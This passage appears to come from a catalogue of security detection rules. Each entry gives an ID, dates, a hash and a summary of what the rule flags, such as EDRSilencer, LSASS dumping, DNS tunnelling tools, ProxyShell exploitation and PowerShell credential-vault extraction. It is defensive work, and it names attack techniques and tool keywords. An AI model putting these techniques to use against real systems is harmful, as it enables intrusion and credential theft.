  Summary: This rule detects the execution of EDRSilencer, a hack tool that leverages
    the Windows Filtering Platform to block outbound traffic of running Endpoint Detection
    and Response (EDR) agents. It identifies specific events where custom outbound
    filters are applied, signaling potential abuse for evading security defenses.
  Updated-Date: '2024_09_04'
980a7598-1e7f-4962-9372-2d754c930d0e:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5367139b8050b7f5d86f4bfa2088f086
  Ruleset: sigmahq
  Summary: This rule detects potential full network packet capture activity in Google
    Cloud Platform (GCP), which could be exploited to intercept and read sensitive
    data from unencrypted internal traffic. It monitors specific methods associated
    with Google Cloud's Compute Packet Mirrorings, including Get, Delete, Insert,
    Patch, List, and aggregatedList. Such activity, while sometimes a legitimate action
    by system or network administrators, could indicate malicious behavior or data
    exfiltration attempts.
  Updated-Date: '2024_09_04'
9827ae57-3802-418f-994b-d5ecf5cd974b:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: cf364ce57fa1848ef6599fe329b69544
  Ruleset: sigmahq
  Summary: This rule detects a potential persistence mechanism by identifying the
    addition of a "Debugger" value to the "DbgManagedDebugger" registry key, which
    triggers when an application crashes. This behavior can indicate an attempt to
    maintain malicious persistence on the system, particularly by exploiting how the
    debugger operates. The rule focuses on ensuring the changes to the specific registry
    path within the Windows environment, filtering out legitimate setups commonly
    found on developers' machines.
  Updated-Date: '2024_09_04'
982e9f2d-1a85-4d5b-aea4-31f5e97c6555:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d6a3d38390d6319b80bef16efd7c4c7f
  Ruleset: core
  Summary: This rule detects the execution of "rundll32.exe" by "svchost.exe" with
    specific command arguments indicating the use of "davclnt.dll,DavSetCookie." This
    behavior may suggest attempts at data exfiltration or the execution of code hosted
    on a WebDav server. It could also potentially indicate exploitation of the CVE-2023-23397
    vulnerability in Microsoft Outlook, which allows for elevation of privilege. The
    rule excludes local IP addresses to reduce false positives.
  Updated-Date: '2024_09_03'
9847f263-4a81-424f-970c-875dab15b79b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 565ba162dcfbf6d2803da7a34c00c9d6
  Ruleset: core
  Summary: This rule detects the execution of `tscon.exe` as the LOCAL SYSTEM user.
    `tscon.exe` is a command-line tool used to connect to another Remote Desktop session.
    Starting `tscon.exe` under the SYSTEM account can indicate an attempt to hijack
    an active Remote Desktop session for privilege escalation or lateral movement
    within a network. This behavior is suspicious and warrants further investigation
    due to its potential to compromise security.
  Updated-Date: '2024_09_03'
98767d61-b2e8-4d71-b661-e36783ee24c1:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f33f1b9e78f5fc39f5b25251fff8d853
  Ruleset: sigmahq
  Summary: This rule detects attempts to decode encoded Gzip archives using PowerShell
    by monitoring command lines that contain 'GZipStream' and '::Decompress'. It is
    designed to catch potential misuse of PowerShell for decompressing Gzip archives,
    which could indicate command-and-control activities associated with malware. Legitimate
    administrative activities that use this functionality can be filtered out by considering
    the parent image, script names, and allowed users and applications.
  Updated-Date: '2024_09_04'
98a96a5a-64a0-4c42-92c5-489da3866cb0:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 28c7a8e05d716d7eb7eba7c0c8b91216
  Ruleset: core
  Summary: This rule detects the execution of well-known DNS exfiltration and tunneling
    tools, specifically identifying processes where the image path ends with 'iodine.exe'
    or contains 'dnscat2'. These tools, such as dnscat2 and iodine, are used for data
    exfiltration and establishing command-and-control channels over DNS. Detecting
    these tools indicates potential unauthorized data transfer and communication through
    DNS, which is often used to bypass network security measures.
  Updated-Date: '2024_09_03'
98b53e78-ebaf-46f8-be06-421aafd176d9:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7120db4d681471eb77660d1331235b9c
  Ruleset: core
  Summary: This rule detects the execution of winPEAS, a script designed to identify
    potential paths for privilege escalation on Windows systems. The detection focuses
    on specific file names related to winPEAS executables and command-line options
    frequently used by the tool, such as searching for installed applications information,
    browser information, interesting events, credential-containing files, process
    information, and services information. Additionally, it includes detection of
    command-line attempts to download the latest version from the official repository.
    The rule is aimed at identifying and alerting on the use of this tool to mitigate
    potential privilege escalation attempts within a Windows environment.
  Updated-Date: '2024_09_03'
98c5aeef-32d5-492f-b174-64a691896d25:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0f92fbb56a42630e40489f00142956b5
  Ruleset: sigmahq
  Summary: This rule detects the usage of the `sc.exe` utility to add a new service
    with special permissions, which effectively hides the service. The `sc.exe` command-line
    interface and the `sdset` command are specifically monitored to identify this
    activity. This behavior is indicative of attempts to maintain persistence, evade
    defenses, or escalate privileges within a Windows environment.
  Updated-Date: '2024_09_04'
98dedfdd-8333-49d4-9f23-d7018cccae53:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 47515b42a61d2bf56a6b4581e010dd0b
  Ruleset: core
  Summary: This rule detects changes to the "NoLMHash" registry value, which determines
    whether Windows is allowed to store LAN Manager (LM) hashes of passwords in Active
    Directory and local Security Account Manager (SAM) databases. Specifically, it
    identifies when this value is set to "0" (DWORD), enabling Windows to store LM
    hashes. This action poses a security risk as LM hashes are less secure and more
    susceptible to attacks.
  Updated-Date: '2024_09_03'
98ffaed4-aec2-4e04-9b07-31492fe68b3d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 21811e9c604df99ed912e9a21fec67a3
  Ruleset: sigmahq
  Summary: This rule detects potential DLL sideloading involving a signed dbghelp.dll
    file by the Sysinternals VMMap application. It focuses on the presence of dbghelp.dll
    in a specific directory (C:\Debuggers\) and its association with the execution
    of vmmap.exe or vmmap64.exe. This form of DLL sideloading could indicate techniques
    related to defense evasion, persistence, or privilege escalation within a Windows
    environment.
  Updated-Date: '2024_09_04'
991a9744-f2f0-44f2-bd33-9092eba17dc3:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1176c85a382f115be061a40668f544e4
  Ruleset: sigmahq
  Summary: This rule detects the use of the `Enable-PSRemoting` cmdlet, which can
    be used by adversaries to enable Windows Remote Management (WinRM). By activating
    WinRM, attackers can leverage valid user accounts to interact with remote Windows
    systems, executing commands and potentially performing various actions as the
    logged-on user. This capability is commonly associated with lateral movement techniques.
  Updated-Date: '2024_09_04'
992a6cae-db6a-43c8-9cec-76d7195c96fc:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 45f05558ecef5111a49b90dc68ce3940
  Ruleset: core
  Summary: This rule detects script interpreters, specifically `wscript.exe` and `cscript.exe`,
    initiating outbound network connections to non-local networks on Windows systems.
    This behavior can indicate that adversaries are using scripts to download malicious
    payloads, potentially for command-and-control purposes. The rule filters out connections
    to local and Microsoft-related IP ranges to reduce false positives, which could
    stem from legitimate script activities.
  Updated-Date: '2024_09_03'
992be1eb-e5da-437e-9a54-6d13b57bb4d8:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8a39e2779bae206b382bcba748e5a2ae
  Ruleset: emerging-threats
  Summary: This rule detects patterns in Uniform Resource Paths (URP) and status codes
    that signify a successful ProxyShell exploitation attack on Microsoft Exchange
    servers. ProxyShell is an attack vector allowing unauthorized access to Exchange
    servers, leveraging vulnerabilities related to the Autodiscover, PowerShell, MAPI,
    and EWS functionalities. The rule identifies successful attacks by monitoring
    specific query strings in web server logs along with HTTP status codes indicating
    successful exploit execution.
  Updated-Date: '2024_09_03'
992dd79f-dde8-4bb0-9085-6350ba97cfb3:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 00fbb0e969124cf4f1a936136c2cd7f2
  Ruleset: sigmahq
  Summary: This rule detects the setting of a new registry value related to BgInfo
    configuration, which could be exploited to execute custom VBScript through "BgInfo.exe".
    It identifies registry modifications under the path '\Software\Winternals\BGInfo\UserFields\'
    that start with '4', indicating potential use of WMI.
  Updated-Date: '2024_09_04'
993c2665-e6ef-40e3-a62a-e1a97686af79:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c79d5b6784c6503f67577ba075b2a84d
  Ruleset: sigmahq
  Summary: This rule detects user certificates that are valid but cannot be strongly
    mapped to a user, which may be indicative of exploitation of elevation of privilege
    vulnerabilities (CVE-2022-34691, CVE-2022-26931, CVE-2022-26923) involving the
    Key Distribution Center (KDC). Such vulnerabilities allow certificate spoofing
    by not enforcing strong user mappings. Specifically, the rule looks for mismatches
    between the AccountName and the Common Name (CN) of the Subject, or CNs ending
    in a dollar sign indicating a machine name. This detection is based on events
    generated by the Kerberos Key Distribution Center service on Windows systems.
  Updated-Date: '2024_09_04'
994cac2b-92c2-44bf-8853-14f6ca39fbda:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 364bf99a29a511e23dc00cd8fab11adb
  Ruleset: emerging-threats
  Summary: This rule detects remote thread injection events typically associated with
    Bumblebee malware. Bumblebee uses legitimate Windows processes such as wabmig.exe,
    wab.exe, and ImagingDevices.exe to inject threads into the rundll32.exe process.
    This behavior is indicative of defense evasion and unauthorized execution activities
    on the system, aiming to blend malicious actions within normal process behavior.
  Updated-Date: '2024_09_03'
9976fa64-2804-423c-8a5b-646ade840773:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ded5df6c6c70e32569e981c08d49ef09
  Ruleset: sigmahq
  Summary: This rule detects suspicious outbound SMTP connections that could indicate
    data exfiltration by adversaries using an un-encrypted network protocol. The rule
    monitors outbound connections on specific SMTP ports (25, 587, 465, 2525) initiated
    from Windows systems. It filters out legitimate email clients and server applications
    such as Thunderbird, Outlook, Microsoft Exchange Server, and certain Windows communication
    apps to reduce false positives.
  Updated-Date: '2024_09_04'
99793437-3e16-439b-be0f-078782cf953d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 32f58c7c0bc835c63b767e6b9d6fa205
  Ruleset: sigmahq
  Summary: This rule detects the execution of the TAP installer, specifically the
    `tapinstall.exe` executable, which is associated with TAP (Terminal Access Point)
    software installation on Windows systems. TAP software is commonly used in conjunction
    with VPN services like OpenVPN, Avast SecureLine VPN, and ProtonVPN. The installation
    of TAP drivers could be preparatory for data exfiltration via tunneling techniques,
    making it a potential indicator of an attack involving data transfer or extraction
    activities. Legitimate installations from recognized VPN software are filtered
    out to reduce false positives.
  Updated-Date: '2024_09_04'
99980a85-3a61-43d3-ac0f-b68d6b4797b1:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4b32d6e2d6a4ac9e55ac873d1163e1c7
  Ruleset: sigmahq
  Summary: This rule detects when a VPN tunnel is modified or deleted in Google Cloud.
    Specific actions monitored include the insertion and deletion of VPN tunnels,
    which may indicate potential unauthorized changes. System administrators may perform
    these modifications, but any changes made by unfamiliar users should be investigated.
    Understanding user identity and behavior can help determine if these actions are
    legitimate or need further scrutiny.
  Updated-Date: '2024_09_04'
999bff6d-dc15-44c9-9f5c-e1051bfc86e1:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: cc20b70b5dd2b2c1e8515332d3778fc2
  Ruleset: sigmahq
  Summary: This rule detects the use of a PowerShell download cradle that employs
    nslookup to extract payloads from DNS records. The method involves utilizing nslookup
    commands to query text records (TXT) that contain the desired payload, which is
    indicative of potentially malicious activity targeting Windows systems.
  Updated-Date: '2024_09_04'
999c3b12-0a8c-40b6-8e13-dd7d62b75c7a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2e91acddac8244d822571379c39c1e10
  Ruleset: sigmahq
  Summary: This rule detects the creation of a new named pipe using the "mkfifo" utility
    in potentially suspicious locations on Linux systems, specifically when the command
    line includes the '/tmp/' directory. Named pipes in these locations could be indicative
    of malicious activities, such as inter-process communication for illicit purposes.
  Updated-Date: '2024_09_04'
999e8307-a775-4d5f-addc-4855632335be:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 54ffa63db9385e20f11418bcadcfe957
  Ruleset: emerging-threats
  Summary: This rule detects command line patterns associated with BlackByte ransomware
    activities on Windows systems. It identifies specific behaviors such as running
    executables from the public user directory and command line executions that include
    disabling the Task Manager or setting services to a disabled startup type. Additionally,
    it looks for PowerShell commands involving Base64 decoding and operations invoking
    the wordpad.exe application. These patterns are indicative of BlackByte ransomware's
    execution, defense evasion, and impact techniques.
  Updated-Date: '2024_09_03'
99b7460d-c9f1-40d7-a316-1f36f61d52ee:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a7a4b90cae04a40b9900bcaefa3944b9
  Ruleset: core
  Summary: This rule detects instances where Wscript or Cscript are used to execute
    files with uncommon, non-script file extensions such as .csv, .dat, .doc, .gif,
    .jpeg, .jpg, .png, .ppt, .txt, .xls, or .xml. This unusual behavior may indicate
    malicious activity, as these scripting engines are typically used to run script
    files, and running non-script files may suggest an attempt to execute code in
    an unexpected or covert manner. The rule is designed to flag such anomalies in
    process creation logs on Windows systems.
  Updated-Date: '2024_09_03'
99b97608-3e21-4bfe-8217-2a127c396a0e:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 36967488976ff41fb5d934cacba57554
  Ruleset: sigmahq
  Summary: This rule detects the creation of a remote thread from a PowerShell process
    targeting uncommon executable files. It focuses on instances where processes like
    'powershell.exe' or 'pwsh.exe' initiate threads in less common targets such as
    'rundll32.exe' or 'regsvr32.exe'. This behavior can be indicative of malicious
    activities, particularly those aimed at evading defenses or execution of unauthorized
    commands, as described in various threat research reports.
  Updated-Date: '2024_09_04'
99c4658d-2c5e-4d87-828d-7c066ca537c3:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3393bb42ee94dca152f263a05d1a9fd5
  Ruleset: core
  Summary: This rule detects the use of the built-in PowerShell cmdlet `Disable-WindowsOptionalFeature`
    which is part of the Deployment Image Servicing and Management (DISM) tool. The
    cmdlet is employed for enumerating, installing, uninstalling, configuring, and
    updating features and packages in Windows images. Specific features of interest
    include various Windows Defender components and potentially other critical system
    features. The detection focuses on the presence of certain keywords and parameters
    in PowerShell script blocks to identify when this cmdlet is being used to potentially
    disable key security features.
  Updated-Date: '2024_09_03'
99c49d9c-34ea-45f7-84a7-4751ae6b2cbc:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: babbedfc1e8a6d6a649b261561ab8b2c
  Ruleset: sigmahq
  Summary: This rule detects the use of PowerShell scripts that aim to extract credentials
    from the Windows Credential Manager. Attackers may target common password storage
    locations to access user credentials, which can be stored in various places depending
    on the operating system or application. This detection focuses on script block
    text that includes specific methods such as 'Get-PasswordVaultCredentials', 'Get-CredManCreds',
    or the creation of new objects related to 'Windows.Security.Credentials.PasswordVault'
    and other credential management techniques.
  Updated-Date: '2024_09_04'
99c840f2-2012-46fd-9141-c761987550ef:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1531532c74ffea3bd3918c8c4a0bbe9d
  Ruleset: core
  Summary: This rule detects the use of `bitsadmin` to download a file from a URL
    containing a direct IP address. Bitsadmin, a command-line tool in Windows, is
    often used for managing background file transfers. The method flags specific command-line
    options associated with Bitsadmin that signify a file download process, particularly
    using IP-listed URLs. The primary indicators involve certain command-line actions
    like `/transfer`, `/create`, and `/addfile`, which are typical of operations in
    downloading files. Additionally, certain URL patterns starting with numeric IP
    addresses are monitored while filtering out legitimate use cases like those related
    to 7-zip. This behavior is suspicious and may be used for evading defenses and
    establishing persistence.
  Updated-Date: '2024_09_03'
99cf1e02-00fb-4c0d-8375-563f978dfd37:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7a3a81b2f9289722d2d76501f9a55887
  Ruleset: core
  Summary: This rule detects suspicious actions involving modifications to Discretionary
    Access Control Lists (DACLs) via the sc.exe utility, specifically targeting critical
    trustees such as interactively logged-on users, service logon users, built-in
    administrators, the local system, and everyone. Such modifications are intended
    to deny access to a service, potentially hiding it or making it impossible to
    stop. This form of security descriptor tampering can compromise system operations
    and is considered a high-risk activity.
  Updated-Date: '2024_09_03'
9a019ffc-3580-4c9d-8d87-079f7e8d3fd4:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1328e7942faf18ef43fd8037fd4db54b
  Ruleset: sigmahq
  Summary: This rule detects the execution of the "cloudflared" tool, which is used
    to establish a tunnel connection to maintain persistence and remote access to
    compromised networks. The detection focuses on specific command-line arguments
    associated with the tool, indicating its potential misuse by threat actors for
    malicious purposes.
  Updated-Date: '2024_09_04'
9a0b8719-cd3c-4f0a-90de-765a4cb3f5ed:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e5bd81ba7c7f98e805b0c0eb497608e8
  Ruleset: sigmahq
  Summary: This rule detects when the Microsoft VBA for Outlook Addin (outlvba.dll)
    is loaded by the Outlook process, identified by outlook.exe. This monitoring aims
    to uncover potential suspicious activity, such as the unauthorized execution of
    macros within Outlook. Legitimate use of macros in Outlook should be filtered
    accordingly to avoid false positives.
  Updated-Date: '2024_09_04'
9a132afa-654e-11eb-ae93-0242ac130002:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1c9b0d79afaf2b1a56b69595ad3cce4c
  Ruleset: core
  Summary: This rule detects the execution of AdFind with specific command-line flags
    that are commonly associated with reconnaissance activities during cyber-attacks.
    AdFind is a tool used for querying Active Directory and is frequently leveraged
    by attackers to gather information about network domains and organizational structures.
    The detection looks for command-line parameters like 'domainlist', 'trustdmp',
    'dcmodes', and 'adinfo', among others, which indicate attempts to enumerate domains,
    trusts, domain controllers, and other sensitive data within an Active Directory
    environment. This rule helps in identifying potential malicious use of AdFind
    by distinguishing suspicious queries that are not generally part of regular administrative
    activity.
  Updated-Date: '2024_09_03'
9a4ccd1a-3526-4d99-b980-9f9c5d3a6ee3:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b706c0a28e6b5885dd289717c4c6a7f4
  Ruleset: emerging-threats
  Summary: This rule detects potential exploitation attempts of CVE-2022-29072, a
    vulnerability in 7-Zip that allows privilege escalation and command execution.
    In 7-Zip version 21.07 and earlier on Windows, dragging a file with a .7z extension
    to the Help>Contents area triggers this vulnerability due to misconfiguration
    in 7z.dll and a heap overflow. The exploit runs a command in a child process under
    the 7zFM.exe process, potentially initiating `cmd.exe`, `powershell.exe`, or `pwsh.exe`.
  Updated-Date: '2024_09_03'
9a4ccd1a-3526-4d99-b980-9f9c5d3a6ff3:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 10ed7b52484c2eed1fe7c6b44f98a729
  Ruleset: core
  Summary: This rule detects potential credential dumping via the Windows Error Reporting
    (WER) LSASS Shtinkering technique. This method involves using Werfault.exe to
    dump the Windows Local Security Authority Subsystem Service (LSASS) process. Specific
    command-line parameters, such as '-u -p', '-ip', and '-s', and conditions where
    the process ID (PID) specified by the '-p' argument points to LSASS while the
    '-ip' argument points to a different process, are indicative of this technique.
    The rule helps identify malicious activities leveraging this approach while recognizing
    possible legitimate Windows Error Reporting behaviors.
  Updated-Date: '2024_09_03'
9a4ff3b8-6187-4fd2-8e8b-e0eae1129495:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4c0726d3d7bc2abdbde2a9986a419f07
  Ruleset: core
  Summary: This rule detects handle requests and access operations to specific Windows
    registry keys associated with the Local Security Authority (LSA), specifically
    targeting the keys 'lsa\JD', 'lsa\GBG', 'lsa\Skew1', and 'lsa\Data'. These keys
    are critical for calculating SysKey, a startup key that encrypts the account database
    of the Windows Security Accounts Manager. Monitoring these handle requests and
    access operations helps in identifying potential attempts to access or manipulate
    sensitive security information.
  Updated-Date: '2024_09_03'
9a60e676-26ac-44c3-814b-0c2a8b977adf:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b96fcc285443dfa9593fd5f5dfd7d3ce
  Ruleset: sigmahq
  Summary: This rule detects incidents where user access has been blocked by Azure
    Conditional Access policies, indicating that the access policy does not permit
    token issuance. This occurrence can be a sign of unauthorized login attempts to
    valid accounts.
  Updated-Date: '2024_09_04'
9a7afa56-4762-43eb-807d-c3dc9ffe211b:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a683a5af47c4153a2cb40a0fd7ab81a3
  Ruleset: sigmahq
  Summary: This rule detects the use of PowerShell commands specifically involving
    the "Send-MailMessage" cmdlet, which adversaries may exploit to exfiltrate data
    over the Simple Mail Transfer Protocol (SMTP). This technique involves sending
    data to an alternate network location different from the main command and control
    server and can involve unencrypted network communication.
  Updated-Date: '2024_09_04'
9aa01d62-7667-4d3b-acb8-8cb5103e2014:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: db231b6a112e95c01191e997d6f6eae1
  Ruleset: emerging-threats
  Summary: This rule detects the execution of DLL side-loading malware associated
    with the APT27 threat group, also known as Emissary Panda. It identifies suspicious
    activities involving the process creation of certain executables, such as 'sllauncher.exe'
    and 'svchost.exe,' which are indicative of this specific type of malware attack.
    These indicators suggest the presence of defense evasion tactics typically employed
    by APT27, highlighting potentially malicious behavior in Windows environments.
  Updated-Date: '2024_09_03'
9aa27839-e8ba-4d7a-ac1a-746c22c3d1e5:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 96bc188a8298951e20bd07455d764a7a
  Ruleset: emerging-threats
  Summary: This rule detects potentially suspicious child processes of the SSH process
    (`sshd`) when executed by a specific user, potentially indicating the exploitation
    of CVE-2024-3094. The rule focuses on the creation of processes by `sshd` where
    the command line begins with 'bash -c' or 'sh -c' and the user is 'root'. This
    kind of activity might point to unauthorized exploitation attempts; however, legitimate
    administrative tasks performed directly with root authentication could also trigger
    this alert if they unnecessarily use these command prefixes.
  Updated-Date: '2024_09_03'
9aa5106d-bce3-4b13-86df-3a20f1d5cf0b:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f3d964dd311a03b28b96de76b0f1825f
  Ruleset: sigmahq
  Summary: This rule detects the execution of the "forfiles" command with the "/c"
    flag on Windows systems. Although this is typical behavior for the tool, it can
    be exploited to execute other binaries indirectly, potentially serving as a method
    to bypass application whitelisting restrictions.
  Updated-Date: '2024_09_04'
9ac8b09b-45de-4a07-9da1-0de8c09304a3:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: eb9f6cd568abe8bb286ead95c608577b
  Ruleset: core
  Summary: This rule detects the obfuscated use of standard input (stdin) to execute
    PowerShell commands through the Invoke-Obfuscation module. It specifically identifies
    patterns where the `cmd` command executes PowerShell with the inclusion of certain
    keywords like `${input}` or `noexit`, which are indicative of script obfuscation
    techniques used to evade detection. The rule is designed to monitor such activities
    within the Windows PowerShell module.
  Updated-Date: '2024_09_03'
9ac94dc8-9042-493c-ba45-3b5e7c86b980:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c1a02624de601ed360b82bca2dd2bedd
  Ruleset: core
  Summary: This rule detects adversarial behavior involving the disabling of important
    scheduled tasks in Windows via the `schtasks.exe` command. The specific command
    line arguments monitored include the use of `/Change`, `/TN`, and `/disable`,
    which are used to modify and disable scheduled tasks. The targeted tasks include
    critical Windows functions such as BitLocker, ExploitGuard, SystemRestore, UpdateOrchestrator,
    Windows Defender, WindowsBackup, and WindowsUpdate. Detecting this activity is
    crucial as it is often a precursor to data-destructive actions conducted by attackers.
  Updated-Date: '2024_09_03'
9ace0707-b560-49b8-b6ca-5148b42f39fb:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 74bc7a09b5b3d396ed703212af3d9eaa
  Ruleset: sigmahq
  Summary: This rule detects the creation of the "UserInitMprLogonScript" registry
    value, which can be exploited by malicious actors to achieve persistence on a
    Windows system. It monitors for events where a registry key is created that contains
    the "UserInitMprLogonScript" and flags these for further investigation, focusing
    on the legitimacy of the added script to distinguish between benign and malicious
    activities.
  Updated-Date: '2024_09_04'
9acf45ed-3a26-4062-bf08-56857613eb52:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fce0fa7091feba6865550e5e0c98af32
  Ruleset: sigmahq
  Summary: This rule detects the addition of new file or path exclusions to MacOS
    Time Machine backups via the "tmutil" utility. Such exclusions could be used by
    an adversary to prevent specific files from being included in backups, thus safeguarding
    them from recovery or scrutiny.
  Updated-Date: '2024_09_04'
9ae01559-cf7e-4f8e-8e14-4c290a1b4784:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 38674f4412e7e23654b2bdd2500bdb14
  Ruleset: sigmahq
  Summary: This rule detects the loading of "credui.dll" and related DLLs by uncommon
    processes. This is significant because attackers may exploit these DLLs to use
    functions like "CredUIPromptForCredentials" or "CredUnPackAuthenticationBufferW",
    which are typically involved in credential prompting and authentication unpacking.
    The detection encompasses multiple specific DLLs and employs filtering to exclude
    well-known, legitimate programs that load these DLLs, thus aiming to reduce false
    positives. The rule also notes potential legitimate processes that could trigger
    it, which should be considered in the evaluation of detections.
  Updated-Date: '2024_09_04'
9b0b7ac3-6223-47aa-a3fd-e8f211e637db:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0c14f38d53fc59777f8306af4171e7cf
  Ruleset: sigmahq
  Summary: This rule detects adversaries hijacking the Registry entries used by Windows
    services to execute their own malicious payloads. By exploiting flaws in the permissions
    for the registry, attackers can redirect the ImagePath value of a service to an
    executable they control, allowing them to launch their code when the service starts.
    The rule specifically looks for the execution of `reg.exe` with commands that
    modify the `ImagePath` under `HKLM\SYSTEM\CurrentControlSet\Services`.
  Updated-Date: '2024_09_04'
9b0f8a61-91b2-464f-aceb-0527e0a45020:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 108f35b13a1513c21979389ea206b71a
  Ruleset: sigmahq
  Summary: This rule detects potential COM object hijacking via the TreatAs subkey
    in the Windows Registry. Specifically, it identifies when a registry key under
    'HKU\' and 'Classes\CLSID\' with '\TreatAs' in its path is created, excluding
    instances where the process creating the key is 'svchost.exe'. COM object hijacking
    is a technique where an attacker exploits the COM registry structure to achieve
    persistence or evade detection.
  Updated-Date: '2024_09_04'
9b5de532-a757-4d70-946c-1f3e44f48b4d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: cff072af54213b7014f25b398e544960
  Ruleset: sigmahq
  Summary: This rule detects the use of the "gcc" utility to execute a shell on Linux
    systems. Such activity may indicate attempts at privilege escalation, unauthorized
    command execution, or escaping from restricted environments. The detection focuses
    on the usage patterns of certain compiler binaries (e.g., gcc, c89, c99) in conjunction
    with shell execution commands.
  Updated-Date: '2024_09_04'
9b64de98-9db3-4033-bd7a-f51430105f00:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2b72957e26f717d294d4e6fa7d58352f
  Ruleset: sigmahq
  Summary: This rule detects the creation or modification of the Windows Terminal
    Profile settings file, "settings.json," by an uncommon process. This activity
    may indicate an attempt to establish persistence through the modification of the
    profile configuration for Windows Terminal. The rule monitors for changes made
    to the specific settings.json file by processes that are typically not associated
    with such modifications, thereby helping to identify potentially malicious behavior.
  Updated-Date: '2024_09_04'
9b72b82d-f1c5-4632-b589-187159bc6ec1:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c9e500b2cbddf4065b8c2530e4a80aa9
  Ruleset: core
  Summary: This rule detects attempts to load drivers that have been blocked due to
    their certificates being revoked by Microsoft. This can serve as an indicator
    of potential privilege escalation activities or attempts to use compromised or
    unsafe drivers. The detection is based on specific events logged by the Windows
    Code Integrity service. This rule is useful for identifying and mitigating security
    risks associated with the loading of unauthorized or potentially malicious drivers.
  Updated-Date: '2024_09_03'
9b8d9203-4e0f-4cd9-bb06-4cc4ea6d0e9a:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1c6f50c25246be34ace58b07f2062433
  Ruleset: core
  Summary: This rule detects the use of obfuscated PowerShell scripts involving MSHTA
    on Windows systems. MSHTA (Microsoft HTML Application) is known for running HTML
    applications and can be exploited to execute malicious scripts. The detection
    focuses on identifying Event ID 4697 in security logs, which indicates the creation
    of a service that includes specific behaviors such as calls to MSHTA and references
    to VBScript functions and commands, indicating a likely attempt to evade defenses
    and execute potentially harmful code.
  Updated-Date: '2024_09_03'
9bd012ee-0dff-44d7-84a0-aa698cfd87a3:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 550f7340b1e718b5011162dc4099404f
  Ruleset: core
  Summary: This rule detects instances where the LSASS process is accessed by another
